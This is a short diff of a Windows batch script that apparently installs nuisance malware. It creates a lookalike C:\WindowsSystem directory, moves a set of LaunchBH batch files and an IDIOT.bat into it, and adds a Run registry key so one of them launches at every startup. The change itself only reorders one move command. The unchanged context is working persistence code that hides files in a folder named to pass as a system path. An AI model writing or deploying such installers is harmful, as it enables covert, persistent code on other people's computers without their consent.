@@ -7,6 +7,7 @@ MD C:\WindowsSystem >NUL
 MD C:\WindowsSystem\aSync >NUL
 MD C:\WindowsSystem\bSync >NUL
 MD C:\WindowsSystem\cSync >NUL
+powershell.exe Move-Item -Path "LaunchBHStart.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "LaunchBH1.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "LaunchBH2.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "LaunchBH3.bat" -Destination "C:\WindowsSystem\cSync"
@@ -17,7 +18,6 @@ powershell.exe Move-Item -Path "LaunchBH7.bat" -Destination "C:\WindowsSystem\cS
 powershell.exe Move-Item -Path "LaunchBH8.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "LaunchBH9.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "LaunchBH10.bat" -Destination "C:\WindowsSystem\cSync"
-powershell.exe Move-Item -Path "LaunchBHStart.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "IDIOT.bat" -Destination "C:\WindowsSystem\cSync"
 powershell.exe Move-Item -Path "logo.txt" -Destination "C:\WindowsSystem\cSync"
 REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v 01 /t REG_SZ /d "C:\WindowsSystem\cSync\LaunchBH2.bat" /f >NUL
